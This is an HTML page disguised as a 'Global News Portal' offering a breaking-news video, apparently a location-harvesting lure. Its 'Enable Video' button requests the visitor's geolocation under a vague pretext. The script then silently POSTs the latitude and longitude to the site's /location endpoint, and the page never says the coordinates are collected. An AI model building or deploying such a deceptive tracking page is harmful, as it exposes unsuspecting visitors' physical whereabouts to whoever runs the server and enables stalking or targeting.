<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Location-Based Video News Portal</title>
    <style>
        /* Basic reset */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        /* Font and colors */
        body {
            font-family: Arial, sans-serif;
            color: #333;
            background-color: #f9f9f9;
        }

        /* Header styles */
        header {
            background-color: #333;
            color: #fff;
            padding: 20px;
            text-align: center;
        }

        header h1 {
            font-size: 2em;
            margin-bottom: 10px;
        }

        header p {
            font-size: 1.1em;
            color: #ccc;
        }

        /* Main content area */
        main {
            max-width: 800px;
            margin: 30px auto;
            padding: 20px;
            background-color: #fff;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
            border-radius: 8px;
        }

        /* Button styling */
        button {
            background-color: #4CAF50;
            color: white;
            padding: 12px 20px;
            font-size: 1em;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            transition: background-color 0.3s ease;
        }

        button:hover {
            background-color: #45a049;
        }

        /* Video container */
        #video-container {
            margin-top: 20px;
            display: none;
            text-align: center;
        }

        iframe {
            width: 100%;
            height: 315px;
            border-radius: 8px;
            border: none;
        }

        /* Footer */
        footer {
            text-align: center;
            margin-top: 40px;
            color: #888;
            font-size: 0.9em;
        }

        /* Responsive adjustments */
        @media (max-width: 600px) {
            header h1 {
                font-size: 1.5em;
            }

            button {
                font-size: 0.9em;
                padding: 10px 15px;
            }
        }
    </style>
</head>
<body>
    <header>
        <h1>Global News Portal</h1>
        <p>Your Trusted Source for Global News and Updates</p>
    </header>

    <main>
        <p>We need your location to show relevant content:</p>
        <button onclick="requestLocation()">Enable Video</button>

        <div id="video-container">
            <h2>Breaking News Video</h2>
            <iframe src="https://www.youtube.com/cUmBV0rqW9I" allowfullscreen></iframe>
        </div>
    </main>

    <footer>
        <p>&copy; 2024 Global News Portal - All Rights Reserved</p>
    </footer>

    <script>
        function requestLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(showVideoAndSendLocation, handleLocationError);
            } else {
                alert("Geolocation is not supported by this browser.");
            }
        }

        function showVideoAndSendLocation(position) {
            document.getElementById('video-container').style.display = 'block';

            const gpsData = {
                latitude: position.coords.latitude,
                longitude: position.coords.longitude
            };

            fetch('/location', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(gpsData)
            })
            .then(response => {
                if (!response.ok) {
                    throw new Error('Failed to send GPS data to server');
                }
                console.log('GPS data sent successfully');
            })
            .catch(error => {
                console.error('Error:', error);
            });
        }

        function handleLocationError(error) {
            switch(error.code) {
                case error.PERMISSION_DENIED:
                    alert("Location access denied. Unable to show video.");
                    break;
                case error.POSITION_UNAVAILABLE:
                    alert("Location information is unavailable.");
                    break;
                case error.TIMEOUT:
                    alert("The request to get user location timed out.");
                    break;
                case error.UNKNOWN_ERROR:
                    alert("An unknown error occurred.");
                    break;
            }
        }
    </script>
</body>
</html>
